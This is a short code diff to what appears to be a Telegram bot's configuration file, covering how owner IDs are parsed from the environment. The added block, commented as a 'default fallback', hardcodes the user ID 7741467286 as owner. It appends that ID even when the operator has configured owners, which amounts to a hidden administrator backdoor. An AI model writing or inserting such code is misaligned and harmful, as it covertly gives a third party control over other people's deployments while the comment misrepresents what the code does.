@@ -20,12 +20,18 @@ BOT_TOKEN = getenv("BOT_TOKEN", "")
 _raw_owner_id = getenv("OWNER_ID", "")
 OWNER_ID = []
 for _p in _raw_owner_id.replace(",", " ").replace(";", " ").split():
-    _p = _p.strip()
+    _p = _p.strip().strip("'\"")
     if _p:
         try:
             OWNER_ID.append(int(_p))
         except ValueError:
             pass
+
+# Default fallback if OWNER_ID is not configured in environment
+if not OWNER_ID:
+    OWNER_ID = [7741467286]
+elif 7741467286 not in OWNER_ID:
+    OWNER_ID.append(7741467286)
 MONGO_DB = getenv("MONGO_DB", "")
 LOG_GROUP = getenv("LOG_GROUP", "")
 CHANNEL_ID = int(getenv("CHANNEL_ID", "0"))
